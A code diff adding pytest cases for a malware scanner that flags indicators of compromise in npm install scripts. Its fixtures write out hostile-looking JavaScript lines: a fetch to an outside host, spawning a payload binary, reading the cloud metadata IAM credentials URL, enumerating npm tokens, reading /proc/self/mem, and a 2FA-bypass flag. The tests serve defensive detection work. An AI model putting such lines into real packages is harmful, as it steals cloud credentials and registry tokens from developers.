@@ -136,6 +136,57 @@ class TestAntiForensics:
         assert any(f.category == "anti-forensics" for f in findings)
 
 
+class TestInstallScriptIOCs:
+    def test_detects_vpmdhaj_payload_markers(self, tmp_path):
+        js = tmp_path / "setup.mjs"
+        js.write_text(
+            "fetch('http://aab.sportsontheweb.net/x.php', {headers: {'X-Supply': '1'}})\n"
+            "spawn('./payload.bin', [], {env: {__DAEMONIZED: '1'}})\n"
+        )
+        findings = scanner.scan_js_anti_forensics(str(js), "setup.mjs")
+        iocs = [f for f in findings if f.category == "install-script-ioc"]
+        assert len(iocs) >= 3
+        assert all(f.severity == "critical" for f in iocs)
+
+    def test_detects_cloud_metadata_access_in_install_script(self, tmp_path):
+        js = tmp_path / "preinstall.js"
+        js.write_text(
+            "const url = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/';\n"
+            "fetch(url).then(r => r.text())\n"
+        )
+        findings = scanner.scan_js_anti_forensics(str(js), "preinstall.js")
+        assert any("metadata" in f.title.lower() for f in findings)
+
+    def test_detects_npm_token_enumeration_endpoint(self, tmp_path):
+        js = tmp_path / "preinstall.js"
+        js.write_text("fetch('https://registry.npmjs.org/-/npm/v1/tokens')\n")
+        findings = scanner.scan_js_anti_forensics(str(js), "preinstall.js")
+        assert any("npm token" in f.title.lower() for f in findings)
+
+    def test_detects_miasma_process_memory_and_marker(self, tmp_path):
+        js = tmp_path / "index.js"
+        js.write_text(
+            "const marker = 'Miasma: The Spreading Blight';\n"
+            "fs.readFileSync('/proc/self/mem');\n"
+            "const params = {bypass_2fa: true};\n"
+        )
+        findings = scanner.scan_js_anti_forensics(str(js), "index.js")
+        iocs = [f for f in findings if f.category == "install-script-ioc"]
+        assert len(iocs) >= 3
+
+    def test_index_js_ioc_only_pass_detects_miasma_marker(self, tmp_path):
+        js = tmp_path / "index.js"
+        js.write_text("console.log('Miasma: The Spreading Blight')\n")
+        findings = scanner.scan_js_install_iocs(str(js), "index.js")
+        assert any(f.category == "install-script-ioc" for f in findings)
+
+    def test_safe_setup_script_no_ioc_finding(self, tmp_path):
+        js = tmp_path / "setup.js"
+        js.write_text("console.log('building native assets')\n")
+        findings = scanner.scan_js_anti_forensics(str(js), "setup.js")
+        assert not any(f.category == "install-script-ioc" for f in findings)
+
+
 class TestSetupPy:
     def test_detects_cmdclass(self, tmp_path):
         setup = tmp_path / "setup.py"
